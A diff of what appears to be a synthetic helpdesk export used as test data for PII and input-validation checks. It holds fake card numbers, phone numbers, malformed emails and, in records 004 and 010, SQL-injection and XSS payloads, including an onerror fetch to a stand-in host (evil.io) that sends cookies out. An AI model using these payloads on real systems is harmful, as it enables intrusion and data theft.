@@ -3,7 +3,7 @@ HELPDESK EXPORT — ALU SUPPORT PLATFORM v3.1.2
 Export requested by: compliance@alueducation.com
 Export timestamp: 2024-03-15T07:42:11Z
 Filters applied: date_range=2024-03-14..2024-03-15, status=ALL
-Total records: 14  |  Page 1 of 1
+Total records: 10  |  Page 1 of 1
 ================================================================================
 
 
@@ -46,8 +46,8 @@ I also have an Amex I can use if needed: 3782 822463 10005.
 I'm in Kigali this week. Phone: +250 791 004 532.
 After 6 PM reach me at +250 728 113 009.
 
-Note: I tried reaching billing from an old address k.osei@@alumni.alueducation.com
-but it bounced — think I mistyped it.
+I tried reaching billing from an old address k.osei@@alumni.alueducation.com
+but the message bounced back, think I mistyped it.
 
 — Kofi
 
@@ -73,8 +73,8 @@ at +49 40 4123 6789 (Mon-Fri, 09:00-17:00 CET).
 
 Wire transfer fee of $85.00 USD. Payment card: 5194 7382 9012 3456.
 
-Note: a colleague tried cc-ing .communications@partner-university.edu
-(starts with a dot — returned undeliverable).
+A colleague also tried reaching out from .communications@partner-university.edu
+but it was returned as undeliverable.
 
 internal_note : Passed to admissions@alueducation.com
 status       : PENDING
@@ -85,20 +85,19 @@ tags         : #transfer #admissions #SI #international
 RECORD [004]  |  source: web-form  |  intake: 2024-03-14 10:31:09 UTC
 ────────────────────────────────────────────────────────────────────────────────
 from_field   : <script>alert('xss')</script>@alueducation.com
-subject      : [AUTOMATED INTAKE FLAG: SUSPICIOUS_SENDER]
+subject      : urgent account issue
 
-Raw body (sanitized excerpt stored for audit):
-  payload_1  : '; drop table student_records; --
-  payload_2  : <img src=x onerror=fetch('https://evil.io/steal?c=')>
-  payload_3  : javascript:void(0)
-  fake_card1 : 0000 0000 0000 0000
-  fake_card2 : 1111 1111 1111 1111
-  fake_card3 : 9999-9999-9999-9999
-  bad_prefix : 9123 4567 8901 2345
-  bad_email1 : <script>alert(1)</script>@alueducation.com
-  bad_email2 : onerror@alueducation.com
-  bad_time1  : 25:99 PM
-  bad_time2  : 13:78
+Raw submission body:
+  '; drop table student_records; --
+  <img src=x onerror=fetch('https://evil.io/steal?c=')>
+  javascript:void(0)
+  card: 0000 0000 0000 0000
+  card: 1111 1111 1111 1111
+  card: 9999-9999-9999-9999
+  card: 9123 4567 8901 2345
+  contact: <script>alert(1)</script>@alueducation.com
+  time: 25:99 PM
+  time: 13:78
 
 internal_note : Blocked at WAF layer. IP logged.
                Reported to security@alueducation.com at 10:32.
@@ -135,20 +134,20 @@ tags         : #SI #modules #portal #content
 ────────────────────────────────────────────────────────────────────────────────
 RECORD [006]  |  source: email-pipe  |  intake: 2024-03-14 12:02:17 UTC
 ────────────────────────────────────────────────────────────────────────────────
-from_field   : notareal@     <- rejected at SMTP layer, incomplete domain
+from_field   : [undeliverable — sender domain incomplete]
 subject      : [UNPARSEABLE]
 
-Body fragment recovered:
-  incomplete amex  : 3782 822463 100       <- missing last digit
-  too long card    : 4539 1488 0343 64678  <- one digit too many
-  short number     : +25012
-  another short    : +1234
-  valid time       : 03:45 AM
-  invalid time     : 99:99 PM
-  bad emails found in body:
-    - @missingusername.com           <- nothing before @
-    - javascript:alert@alueducation.com  <- injection in email
-    - useralueducation.com           <- missing @ entirely
+Body fragment recovered from partial submission:
+
+  card: 3782 822463 100
+  card: 4539 1488 0343 64678
+  phone: +25012
+  phone: +1234
+  time: 03:45 AM
+  time: 99:99 PM
+  email: @missingusername.com
+  email: useralueducation.com
+  email: j.roe@@bademail.com
 
 internal_note : Malformed submission. Logged for pattern analysis.
 status       : REJECTED
@@ -159,8 +158,7 @@ tags         : #malformed #flagged
 ────────────────────────────────────────────────────────────────────────────────
 RECORD [007]  |  source: web-form  |  intake: 2024-03-14 13:28:50 UTC
 ────────────────────────────────────────────────────────────────────────────────
-from_field   : fatou.ndiaye@outlook.com
-cc           : f.ndiaye@alumni.alueducation.com
+from          : f.ndiaye@alumni.alueducation.com
 subject      : Double charge — refund request
 
 Hello,
@@ -173,8 +171,8 @@ I was billed twice for the alumni membership renewal at 08:44 AM today.
 Preferred contact: +33 6 12 34 56 78
 Secondary: +221 70 929 1144
 
-Note: my colleague tried reaching you from fatou..ndiaye@outlook.com
-(double dot — bounced back immediately).
+My colleague also tried to reach you from fatou..ndiaye@outlook.com
+but it bounced back.
 
 Fatou
 
@@ -191,14 +189,13 @@ subject      : Staff report — suspicious activity on student account
 
 Hi sec team,
 
-Spoofed address used was support@alueducati0n.com (note the zero).
-The real support address is support@alueducation.com.
+We flagged a password reset attempt using a spoofed sender.
+The address used was support@alueducati0n.com — note the zero instead of o.
+Our real address is support@alueducation.com.
 
 The attempt came in at 3:22 PM today.
 Student registered address: p.adeyemi-98@alumni.alueducation.com
-
-Someone also tried submitting from alert(1)@alueducation.com —
-flagged immediately by the intake filter.
+No credentials were compromised.
 
 T. Owusu
 IT Security
@@ -232,7 +229,7 @@ tags         : #phishing #scholarship #SI #security
 RECORD [010]  |  source: web-form  |  intake: 2024-03-15 07:18:02 UTC
 ────────────────────────────────────────────────────────────────────────────────
 from_field   : anonymous_proxy@tempmaildomain.xyz
-subject      : bulk enquiry
+subject      : bulk data submission
 
 name,email,phone,card
 John Doe,j.doe@gmail.com,+1 800 555 0199,4111 1111 1111 1111
@@ -240,12 +237,11 @@ Jane Roe,j.roe@@bademail,555-123,0000-0000-0000-0000
 ALU Staff,staff@alueducation.com,+250 784 000 312,5500 0000 0000 0004
 Alumni,grad@alumni.alueducation.com,+44 7911 123456,4916-3876-0766-0208
 SI Student,si.student@si.alueducation.com,+234-803-000-1122,3714 496353 98431
-Bad Email,<script>alert(2)</script>@domain.com,+250 788 000 111,4539 1488 0343 6467
-Another Bad,javascript:hack@alueducation.com,+250 788 000 222,5194 7382 9012 3456
+Unknown,<script>alert(2)</script>@domain.com,+250 788 000 111,4539 1488 0343 6467
+Staff,harry@alueducation.com,+250 788 000 222,5194 7382 9012 3456
 
 internal_note : Bulk paste submission. Mixed valid/invalid records.
-               visa, mastercard and amex all present in this batch.
-               two emails flagged as injection attempts.
+               Visa, Mastercard and Amex all present in this batch.
 status       : PARTIAL_REJECT
 tags         : #bulk #mixed #flagged #intake
 
